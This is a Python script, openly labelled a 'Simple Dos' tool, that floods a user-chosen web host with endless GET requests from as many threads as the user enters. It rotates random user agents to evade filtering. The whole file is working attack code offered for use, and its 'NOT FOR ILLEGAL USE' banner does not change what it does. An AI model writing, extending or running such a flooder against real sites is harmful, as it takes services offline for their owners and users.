import requests
from threading import Thread
import socket
from fake_useragent import UserAgent
import os


class Bot_ack:
    def __init__(self, page, port, UA):
        self.port = port
        self.headers = UA
        self.page = page


        if self.port:
            self.target = "http://"+page+":"+self.port

        elif self.page[:4] == 'http':
            self.target = page

        else:
            self.target = "http://" + page

    def ip_return(self):
        if self.page[:4] == 'http':
            splitted_page = self.page.split("//")
            print("splitted page: ", splitted_page[1])
            the_ip = socket.gethostbyname(splitted_page[1])
            print("[The ip of page] : ", the_ip)
        else:
            pass


    def install_module(self):
        quest = input("Want to install fake_useragent module [Y/N] ?:  ")
        if quest.upper().strip() == 'Y':
            os.system("python3 -m pip install fake_useragent")
        else:
            pass


    def requesting(self):


        while True:
            header = {'User-Agent': str(self.headers.random)}

            r = requests.get(self.target, headers=header)
            print("[+]ReQ Status: ", r.status_code,"To:",self.target)
            print("Headers used: ", header)


    def worker(self):
        num_workers = input("Enter amount of workers: ").strip()
        threadcount = 0
        for i in range(0, int(num_workers)):
            Thread(target=self.requesting).start()
            threadcount += 1
            print("[["+str(threadcount)+"]]Threads started")


os.system("clear")

thecow = """
               (__)                 (__)
               (oo)    Coded By:    (oo)
                \/   ____________    \/
               /||\  |  PyManic |   /||\     
                /\   ____________    /\\
                ~~    Simple Dos     ~~ 
  __________________________________________________ 
                     |DEVILTWINS|
  _________-_____________________________-__________
                 |NOT FOR ILLEGAL USE|
  __________________________________________________
                                                     """

print(thecow)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)

UA = UserAgent()

the_page = input("Enter page: ")
port = input("Choose specific port or it will be default: ").strip()


if __name__ == '__main__':
    bot_1 = Bot_ack(the_page, port, UA)
    bot_1.ip_return()
    bot_1.install_module()
    bot_1.s = s
    bot_1.worker()
